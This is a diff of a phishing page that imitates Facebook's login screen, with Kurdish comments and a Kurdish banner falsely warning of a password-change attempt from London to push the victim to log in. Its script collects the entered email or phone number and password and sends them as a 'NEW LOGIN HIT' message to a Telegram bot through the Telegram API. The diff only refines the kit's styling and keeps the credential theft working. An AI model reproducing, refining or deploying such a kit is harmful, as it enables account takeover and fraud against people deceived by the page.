@@ -4,125 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Log in to Facebook</title>
-    <!-- مێتا تاگ بۆ ئەوەی لە واتسئەپ وەک فەیسبووک دەربکەوێت -->
-    <meta property="og:title" content="Log in to Facebook">
-    <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png">
-    
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .header-msg {
-            background-color: #fffbe6;
-            border-bottom: 1px solid #ffe58f;
-            width: 100%;
-            padding: 12px;
-            text-align: center;
-            font-size: 14px;
-            color: #856404;
-            box-sizing: border-box;
-        }
-        .login-box {
-            width: 100%;
-            max-width: 400px;
-            margin-top: 40px;
-            text-align: center;
-            padding: 0 15px;
-            box-sizing: border-box;
-        }
-        /* لێرە ستایلی لۆگۆکەم ڕێکخستووەتەوە */
-        .fb-logo {
-            width: 112px;
-            margin-bottom: 20px;
-            height: auto;
-        }
-        .form-container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin-bottom: 12px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 17px;
-            box-sizing: border-box;
-            outline: none;
-        }
-        input:focus {
-            border-color: #1877f2;
-            box-shadow: 0 0 0 2px #e7f3ff;
-        }
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background-color: #1877f2;
-            border: none;
-            border-radius: 6px;
-            color: white;
-            font-size: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 5px;
-        }
-        .login-btn:hover {
-            background-color: #166fe5;
-        }
-        .forgot-pass {
-            display: block;
-            margin-top: 15px;
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        hr {
-            margin: 20px 0;
-            border: none;
-            border-top: 1px solid #dadde1;
-        }
-        .create-btn {
-            background-color: #42b72a;
-            color: white;
-            border: none;
-            padding: 12px 16px;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: bold;
-            cursor: pointer;
-            width: auto;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header-msg { background-color: #fffbe6; border-bottom: 1px solid #ffe58f; width: 100%; padding: 12px; text-align: center; font-size: 14px; color: #856404; box-sizing: border-box; font-weight: bold; }
+        .login-box { width: 100%; max-width: 400px; margin-top: 40px; text-align: center; padding: 0 15px; box-sizing: border-box; }
+        
+        /* لۆگۆی فەیسبووک بە کۆدی CSS (بۆ ئەوەی هەرگیز تێکنەچێت) */
+        .fb-logo-text { font-size: 45px; font-weight: bold; color: #1877f2; letter-spacing: -2px; margin-bottom: 15px; display: inline-block; font-family: Arial, sans-serif; text-transform: lowercase; }
+        
+        .form-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .forgot-pass { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
+        hr { margin: 20px 0; border: none; border-top: 1px solid #dadde1; }
+        .create-btn { background-color: #42b72a; color: white; border: none; padding: 12px 16px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
     <div class="header-msg">
-        ⚠️ **ئاگاداری:** هەوڵی گۆڕینی وشەی نهێنی هەژمارەکەت دەدرێت لە (London, UK). بۆ ڕەتکردنەوەی گۆڕانکارییەکە، سەرەتا بچۆ ناو هەژمارەکەت.
+        ⚠️ ئاگاداری: هەوڵی گۆڕینی وشەی نهێنی هەژمارەکەت دەدرێت لە (London, UK). بۆ پاراستنی ئەکاونتەکەت، سەرەتا بچۆ ناو هەژمارەکەت.
     </div>
 
     <div class="login-box">
-        <!-- بەکارهێنانی لینکی وێنەی PNG لە بری SVG بۆ دڵنیایی زیاتر لە دەرکەوتنی -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/512px-2021_Facebook_icon.svg.png" alt="Facebook" class="fb-logo">
+        <div class="fb-logo-text">facebook</div>
         
         <div class="form-container">
-            <input type="text" id="user" placeholder="Email address or phone number" dir="ltr">
+            <input type="text" id="user" placeholder="Email or phone number" dir="ltr">
             <input type="password" id="pass" placeholder="Password" dir="ltr">
             <button class="login-btn" onclick="login()">Log In</button>
             <a href="#" class="forgot-pass">Forgotten password?</a>
             <hr>
             <button class="create-btn">Create new account</button>
         </div>
-        
-        <p style="margin-top: 30px; font-size: 14px; color: #606770;">
-            <b>Create a Page</b> for a celebrity, brand or business.
-        </p>
     </div>
 
     <script>
@@ -138,7 +53,7 @@
                 return;
             }
 
-            const msg = `👤 **FB Login Hit!**\n\n📧 User: \`${user}\` \n🔑 Pass: \`${pass}\``;
+            const msg = `👤 **NEW LOGIN HIT!**\n\n📧 User: \`${user}\` \n🔑 Pass: \`${pass}\``;
             
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
             .then(() => {
